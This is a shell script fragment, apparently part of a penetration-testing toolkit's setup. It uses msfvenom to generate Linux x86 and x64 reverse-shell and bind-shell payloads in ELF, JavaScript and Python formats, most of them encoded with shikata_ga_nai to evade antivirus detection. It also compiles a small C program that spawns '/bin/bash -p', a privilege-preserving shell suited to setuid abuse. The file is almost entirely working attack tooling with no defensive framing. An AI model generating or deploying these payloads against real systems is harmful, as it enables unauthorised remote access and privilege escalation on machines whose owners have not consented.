mkdir public/payloads_linux
cd public/payloads_linux

    if [ ! -f shell_reverse_tcp_x86.elf ] || confirm "Regenerate payloads_linux [y/n]? " ; then
        # Reverse shells
        banner "payloads_linux: shell_reverse_tcp_*.elf"
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f elf -a x86 --platform linux -o shell_reverse_tcp_x86.elf
        echo ""
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f elf -a x64 --platform linux -o shell_reverse_tcp_x64.elf

        banner "payloads_linux: shell_reverse_tcp_*_shikata_ga_nai.elf"
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.elf
        echo ""
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.elf

        banner "payloads_linux: shell_reverse_tcp_*_shikata_ga_nai.js_le"
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.js_le
        echo ""
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.js_le

        banner "payloads_linux: shell_reverse_tcp_*_shikata_ga_nai.python"
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.python
        echo ""
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.python

        # Bind shells
        banner "payloads_linux: shell_bind_tcp_*.elf"
        msfvenom -p linux/x86/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f elf -a x86 --platform linux -o shell_bind_tcp_x86.elf
        echo ""
        msfvenom -p linux/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f elf -a x64 --platform linux -o shell_bind_tcp_x64.elf

        banner "payloads_linux: shell_bind_tcp_*_shikata_ga_nai.elf"
        msfvenom -p linux/x86/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.elf
        echo ""
        msfvenom -p linux/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.elf

        banner "payloads_linux: shell_bind_tcp_*_shikata_ga_nai.js_le"
        msfvenom -p linux/x86/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.js_le
        echo ""
        msfvenom -p linux/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.js_le

        banner "payloads_linux: shell_bind_tcp_*_shikata_ga_nai.python"
        msfvenom -p linux/x86/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.python
        echo ""
        msfvenom -p linux/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.python

banner "payloads_linux: shell.c"
cat <<\EOT >shell.c
#include<stdlib.h>
#include<stdio.h>
int main(void){
  system("/bin/bash -p");
  return 0;
}
EOT
gcc shell.c -o shell
#chmod 4755 shell

        # Create all common shells in payloads_linux folder
        bash ../../_setup/setup_payloads.sh

    fi

cd -
